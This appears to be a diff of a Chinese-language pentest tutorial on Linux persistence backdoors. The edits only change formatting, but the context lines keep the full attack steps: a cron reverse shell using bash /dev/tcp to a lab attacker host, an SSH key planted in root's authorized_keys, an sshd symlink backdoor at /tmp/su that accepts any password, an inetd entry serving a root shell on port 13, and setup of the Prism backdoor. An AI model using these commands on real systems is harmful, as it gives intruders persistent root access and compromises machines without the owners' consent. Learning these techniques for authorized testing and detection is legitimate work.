@@ -28,7 +28,7 @@ crontab [-u user] -[i]r :从/var/spool/cron目录中删除某个用户的crontab
     nc -lvvp 6666
     ```
 
-    ​![image](assets/image-20241031161038-vsdkz5v.png)​
+    ![image](assets/image-20241031161038-vsdkz5v.png)​
 2. 目标机写入计划任务
 
     ```bash
@@ -36,13 +36,13 @@ crontab [-u user] -[i]r :从/var/spool/cron目录中删除某个用户的crontab
     */1 * * * * bash -i >& /dev/tcp/攻击机/端口 0>&1
     [root@CentOS7 ~]# crontab -e 
     */1 * * * * bash -i >& /dev/tcp/192.168.134.128/6666 0>&1
-
+    
     ```
 
-    ​​![image](assets/image-20241031164346-yq36ztc.png)​​​​
+    ​![image](assets/image-20241031164346-yq36ztc.png)​​​​
 3. 目标机自动执行后，攻击机获得反弹shell
 
-    ​![image](assets/image-20241031164313-43j8noi.png)​
+    ![image](assets/image-20241031164313-43j8noi.png)​
 
 ### ssh公钥免密
 
@@ -70,7 +70,7 @@ crontab [-u user] -[i]r :从/var/spool/cron目录中删除某个用户的crontab
 ssh-keygen -t rsa
 ```
 
-​![image](assets/image-20241031164923-i2up00d.png)​
+![image](assets/image-20241031164923-i2up00d.png)​
 
 将攻击机.ssh目录下的id_rsa.pub复制到目标服务器的/root/.ssh、authorized_keys文件里
 
@@ -78,7 +78,7 @@ ssh-keygen -t rsa
 scp ~/.ssh/id_rsa.pub root@目标ip地址:/root/.ssh/authorized_keys
 ```
 
-​​![image](assets/image-20241031175942-1oavjaj.png)​​
+​![image](assets/image-20241031175942-1oavjaj.png)​​
 
 目标服务器中，将authorized_keys的权限改为600
 
@@ -86,7 +86,7 @@ scp ~/.ssh/id_rsa.pub root@目标ip地址:/root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
 ```
 
-​![image](assets/image-20241031180022-x8go1h2.png)​
+![image](assets/image-20241031180022-x8go1h2.png)​
 
 免密连接目标服务器
 
@@ -94,7 +94,7 @@ chmod 600 /root/.ssh/authorized_keys
 ssh root@192.168.134.132
 ```
 
-​![image](assets/image-20241031180101-vtmqllg.png)​
+![image](assets/image-20241031180101-vtmqllg.png)​
 
 ### ssh软连接后门
 
@@ -121,7 +121,7 @@ ln -sf  /usr/sbin/sshd /tmp/su
 /tmp/su -oPort=8081
 ```
 
-​![image](assets/image-20241031180306-kuddcdf.png)​
+![image](assets/image-20241031180306-kuddcdf.png)​
 
 尝试使用ssh连接目标服务器，使用**任意密码**都可以登录
 
@@ -129,7 +129,7 @@ ln -sf  /usr/sbin/sshd /tmp/su
 ssh root@192.168.134.132 -p 8081
 ```
 
-​![image](assets/image-20241031180427-6nzyc9c.png)​
+![image](assets/image-20241031180427-6nzyc9c.png)​
 
 ### inetd/xined后门  13端口
 
@@ -167,9 +167,9 @@ apt-get install openbsd-inetd
 
 向/etc/inetd.conf文件中加入一行：daytime stream tco nowait root /bin/bash bash -i
 
-​​![image](assets/image-20241031201707-vpecsp7.png)​​​​![image](assets/image-20241031202004-wgnm0fh.png)​​
+​![image](assets/image-20241031201707-vpecsp7.png)​​​​![image](assets/image-20241031202004-wgnm0fh.png)​​
 
-​​
+​
 
 开启inet 之后使用nc连接  nc -lvvp 目标IP 13
 
@@ -179,13 +179,13 @@ systemctl start inetd      开启服务
 systemctl enable inetd.service
 ```
 
-​​![image](assets/image-20241031202137-p6pqd8a.png)​​
+​![image](assets/image-20241031202137-p6pqd8a.png)​​
 
 ```bash
 nc -v 192.168.134.150 13
 ```
 
-​![image](assets/image-20241031202308-bg4alqf.png)​
+![image](assets/image-20241031202308-bg4alqf.png)​
 
 ### Prism后门
 
@@ -203,7 +203,7 @@ nc -v 192.168.134.150 13
 gcc -DDETACH -Wall -s -o prism prism.c
 ```
 
-​![image](assets/image-20241031180753-i1xxar7.png)​
+![image](assets/image-20241031180753-i1xxar7.png)​
 
 编译完成后，查看prism后门配置信息
 
@@ -211,7 +211,7 @@ gcc -DDETACH -Wall -s -o prism prism.c
 ./prism Inf0
 ```
 
-​​![image](assets/image-20241031180923-3w4w3ze.png)​​
+​![image](assets/image-20241031180923-3w4w3ze.png)​​
 
 将该后门上传到目标机中，再以root用户运行sendPacket.py脚本
 
@@ -220,7 +220,7 @@ sudo python2 ./sendPacket.py 目标IP 密码 攻击机ip 端口
 [root@CentOS7 tmp]# sudo python2 ./sendPacket.py 192.168.134.132 p4ssw0rd 192.168.134.128 6767
 ```
 
-​![image](assets/image-20241031181206-jvok58v.png)​
+![image](assets/image-20241031181206-jvok58v.png)​
 
 攻击机监听相关端口 等待后门连接
 
@@ -228,4 +228,5 @@ sudo python2 ./sendPacket.py 目标IP 密码 攻击机ip 端口
 nv -lvvp 监听端口
 ```
 
-​![image](assets/image-20241031181217-cd06ut5.png)​
+![image](assets/image-20241031181217-cd06ut5.png)​
+
